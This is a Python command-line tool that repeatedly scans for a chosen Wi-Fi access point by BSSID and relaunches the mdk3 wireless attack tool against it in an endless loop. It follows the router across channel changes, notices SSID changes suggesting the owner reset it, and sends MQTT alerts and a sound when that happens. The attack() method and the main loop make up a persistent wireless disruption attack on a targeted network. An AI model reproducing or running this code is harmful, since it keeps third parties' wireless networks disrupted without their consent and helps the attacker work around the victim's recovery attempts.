"""Track a BSSID across repeated scans and orchestrate existing mdk3 processes.

The Click entry point runs an indefinite loop with MQTT notifications and an
optional sound when an already-known SSID changes.
"""

from __future__ import annotations

import threading
from typing import Any, NoReturn, Self, Union

import click
import playsound
from rich.traceback import install

from config import Config
from func import get_networks, kill, mdk3, notify, sleep
from logger import logger


class Target(object):
    """Hold target observations and the settings for the scan/restart loop."""

    def __init__(
        self: Self,
        interface: str,
        bssid: str,
        /,
        whitelist: Union[click.File, None] = None,
        blacklist: Union[click.File, None] = None,
        mode: int = 2,
        interval: int = 30,
        debug: bool = False,
    ) -> None:
        """Store options and lowercase the BSSID without starting operations.

        ``interval`` defaults to 30 seconds here; the CLI defaults to 60.
        Whitelist and blacklist are file objects passed through to mdk3.
        """
        self.interface = interface
        self.bssid = bssid.lower()
        self.whitelist = whitelist
        self.blacklist = blacklist
        self.mode = mode
        self.interval = interval
        self.debug = debug

    def __setattr__(self, name: str, value: Any, /) -> None:
        """Delegate assignment to the default object implementation."""
        return super().__setattr__(name, value)

    def __getattribute__(self, name: str, /) -> Any:
        """Return attributes, logging missing ones in debug mode and returning None."""
        try:
            return super().__getattribute__(name)
        except AttributeError as err:
            if self.debug:
                logger.error(err)

    def __repr__(self) -> str:
        """Describe the target using its most recently observed metadata."""
        return f"<{__name__}.Target BSSID={self.bssid!r} SSID={self.ssid!r} CHANNEL={self.channel!r} POWER={self.power!r} object at 0x{id(self):x}>"

    @property
    def bssid(self: Self) -> str:
        """Return the stored access point identifier."""
        return self._bssid

    @bssid.setter
    def bssid(self: Self, value: str) -> None:
        """Store a BSSID verbatim; only construction performs lowercasing."""
        self._bssid = value

    @property
    def channel(self) -> Union[int, None]:
        """Return the most recently observed channel, or ``None``."""
        if hasattr(self, "_channel"):
            return self._channel

    @channel.setter
    def channel(self, ch):
        """Notify when two known channels differ, then store the new channel."""
        if self.channel and ch and self.channel != ch:
            logger.info(_ := f"Target channel changed → CH {self.channel} → {ch}")
            notify(_)

        self._channel = ch

    @property
    def rsn(self):
        """Return parsed Robust Security Network information, when available."""
        if hasattr(self, "_rsn"):
            return self._rsn

    @rsn.setter
    def rsn(self, value):
        """Store the RSN mapping from the latest scan."""
        self._rsn = value

    @property
    def ssid(self):
        """Return the most recently observed network name, or ``None``."""
        if hasattr(self, "_ssid"):
            return self._ssid

    @ssid.setter
    def ssid(self, value):
        """Notify and play an optional sound when two known SSIDs differ."""
        if self.ssid and value and self.ssid != value:
            logger.info(_ := "Target router SSID changed — reset suspected.")
            notify(_)

            self.play()

        self._ssid = value

    def find(self: Self) -> int:
        """Scan once, update observations, notify, and return one if found.

        Clear observations and return zero when the target is absent. Parsing
        and notification errors propagate rather than becoming a zero result.
        """
        networks = get_networks(self.interface)

        if network := networks.get(self.bssid):
            self.channel, self.ssid, self.power, self.rsn = network

            logger.info(
                _ := f"Target detected: SSID={self.ssid!r} BSSID={self.bssid!r} on channel {self.channel!r}"
            )
            notify(_)

            return 1

        self.ssid = self.power = self.channel = self.rsn = None

        logger.info(_ := "Target not detected.")
        notify(_)

        return 0

    def attack(self: Self) -> NoReturn:
        """Repeat process termination, scanning, launch, and an interval wait.

        Missing targets cause a half-interval wait before another scan. The
        loop has no shutdown cleanup for child processes or interface state.
        """
        while True:
            kill("mdk3")

            if self.find():
                mdk3(
                    self.interface,
                    self.bssid,
                    self.channel,
                    self.mode,
                    self.whitelist,
                    self.blacklist,
                )
                sleep(self.interval)

                continue

            sleep(self.interval / 2, simple=True)

    def start(self: Self):
        """Reserved placeholder; currently performs no action."""
        pass

    def play(self: Self):
        """Play ``Config.SOUND`` in a new thread when a sound path is configured."""
        if sound := Config.SOUND:
            threading.Thread(target=playsound.playsound, args=(sound,)).start()


@click.command()
@click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
@click.option(
    "--whitelist",
    type=click.File(),
    help="Read file containing MACs not to care about (Whitelist Mode).",
)
@click.option(
    "--blacklist",
    type=click.File(),
    help="Read file containing MACs to run tests on (Blacklist Mode).",
)
@click.option("--mode", type=int, default=2)
@click.option("--interval", type=int, default=60)
@click.option("--debug", is_flag=True, default=False)
@click.argument("interface")
def main(
    bssid: str,
    whitelist: click.File,
    blacklist: click.File,
    mode: int,
    interval: int,
    debug: bool,
    interface: str,
) -> None:
    """Run the scan/restart loop for INTERFACE using the supplied CLI options."""
    if debug:
        pass

    target: Target = Target(
        interface,
        bssid,
        whitelist=whitelist,
        blacklist=blacklist,
        mode=mode,
        interval=interval,
        debug=debug,
    )

    target.attack()


def cli() -> None:
    """Install Rich tracebacks and invoke the command from either entry point."""
    install()
    main()


if __name__ == "__main__":
    cli()
